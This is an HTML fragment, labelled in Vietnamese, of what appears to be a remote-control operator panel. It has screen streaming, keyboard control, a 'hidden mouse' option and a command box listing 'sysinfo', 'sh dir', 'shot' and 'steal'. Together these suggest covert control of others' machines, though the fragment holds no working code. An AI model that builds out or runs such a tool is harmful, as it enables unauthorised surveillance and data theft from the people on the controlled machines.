            <div id="bar">
             <span id="who">Chua chon may</span>
             <label><input type="checkbox" id="hid" checked> Chuot an</label>
             <label>FPS <select id="fps"><option>5</option><option>8</option><option selected>12</option><option>16</option><option>20</option><option>25</option></select></label>
             <label>Chat luong <input type="range" id="qual" min="20" max="90" value="55" style="width:80px"></label>
             <label>Thu nho <select id="scale"><option>0.35</option><option selected>0.5</option><option>0.65</option><option>0.8</option><option>1</option></select></label>
             <label>Man <select id="mon"><option value="1">1</option></select></label>
             <button id="pause">Tam dung</button>
             <button id="kb" class="pri">Ban phim: ON</button>
             <button id="fs">Toan man hinh</button>
            </div>
            <div id="stage"><canvas id="view" tabindex="0"></canvas>
             <div id="hint">Chon 1 may ben trai de dieu khien</div></div>
            <div id="term">
             <div id="out"></div>
             <div class="row"><input id="cmd" placeholder="Nhap lenh: sysinfo | sh dir | shot | steal | help"><button id="run" class="pri">Chay</button></div>
             <div id="quick"></div>
            </div>
           </main>
